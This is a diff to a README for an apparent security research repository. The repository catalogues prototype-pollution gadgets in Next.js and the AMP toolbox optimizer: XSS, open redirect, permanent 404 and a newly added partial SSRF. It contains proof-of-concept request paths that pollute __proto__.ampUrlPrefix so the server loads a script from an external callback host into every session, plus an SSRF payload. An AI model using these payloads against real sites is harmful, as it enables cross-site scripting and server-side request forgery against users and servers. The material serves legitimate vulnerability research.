@@ -18,21 +18,23 @@ npm start
 
 > Lot of unexplored surface. If you find anything send a pull request :)
 
-| Name                              | Description                                        | Type          | Package                         | Completed |
-| --------------------------------- | -------------------------------------------------- | ------------- | ------------------------------- | :-------: |
-| [AMP first look](#amp-first-look) | via `ampUrlPrefix` in `ampOptimizer.transformHtml` | XSS           | `@ampproject/toolbox-optimizer` |     ✔     |
-| [Redirect SSR](#redirect-ssr)     | via `redirect.destination` in `getServerSideProps` | Open Redirect | `next`                          |     ✔     |
-| [404 SSR](#404-ssr)               | via `notFound` in `getServerSideProps`             | Permanant 404 | `next`                          |     ✔     |
-| More AMP                          |                                                    |               |                                 |           |
-| React Server Components           |                                                    |               |                                 |           |
-| Image & Font Optimization         |                                                    |               |                                 |           |
-| API & Middlewares                 |                                                    |               |                                 |           |
-| Router                            |                                                    |               |                                 |           |
-| Prisma                            |                                                    |               |                                 |           |
+| Name                              | Description                                        | Type               | Package                         | Completed |
+| --------------------------------- | -------------------------------------------------- | ------------------ | ------------------------------- | :-------: |
+| [AMP first look](#amp-first-look) | via `ampUrlPrefix` in `ampOptimizer.transformHtml` | XSS + Partial SSRF | `@ampproject/toolbox-optimizer` |     ✔     |
+| [Redirect SSR](#redirect-ssr)     | via `redirect.destination` in `getServerSideProps` | Open Redirect      | `next`                          |     ✔     |
+| [404 SSR](#404-ssr)               | via `notFound` in `getServerSideProps`             | Permanant 404      | `next`                          |     ✔     |
+| More AMP                          |                                                    |                    |                                 |           |
+| React Server Components           |                                                    |                    |                                 |           |
+| Image & Font Optimization         |                                                    |                    |                                 |           |
+| API & Middlewares                 |                                                    |                    |                                 |           |
+| Router                            |                                                    |                    |                                 |           |
+| Prisma                            |                                                    |                    |                                 |           |
 
 ## AMP first look
 
-via `ampUrlPrefix` in `ampOptimizer.transformHtml` (Session-wide XSS (like broadcast)).
+Cross-Site Scripting via `ampUrlPrefix` in `ampOptimizer.transformHtml` (Session-wide like broadcast due to server-side rendering).
+
+Also a partial SSRF via `node-fetch` during AMP transform.
 
 **Poc**
 
@@ -43,11 +45,15 @@ via `ampUrlPrefix` in `ampOptimizer.transformHtml` (Session-wide XSS (like broad
 # XSS on a Non-AMP Page (but AMP should be enabled in atleast one other page on the site)
 /vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
 
+# Partial SSRF - works if route `/*` does not return 404 else server hangs
+/vulnerable?__proto__.ampUrlPrefix=https://URL/
+
 ```
 
 **Cause**
 
-Requires 2 stages to poision the server-side code with our payload because AMP check happens before the pollution in `getServerSideProps`. So we pollute in the first request and trigger in another which does a new AMP check and optimize. Once it's poisioned any single subsequent request will trigger XSS on any session as the server-side code is poisioned via prototype pollution.
+Requires 2 stages to poision the server-side code with our payload because AMP check happens before the pollution in `getServerSideProps`. So we pollute in the first request and trigger in another which does a new AMP check and optimize.
+Once it's poisioned any single subsequent request will trigger XSS on any session as the server-side code is poisioned via prototype pollution.
 
 ```js
 // next/server/render.tsx
@@ -89,7 +95,8 @@ async transformHtml(t, e) {
 // <script async="" src="https://xss-callback.pwnfunction.repl.co/v0.js"></script>
 ```
 
-> Note: In `next.config.js`, we skip validation `skipValidation: true`, this is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)
+> Note: In `next.config.js`, we skip validation `skipValidation: true`.
+> This is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)
 
 ## Redirect SSR
 
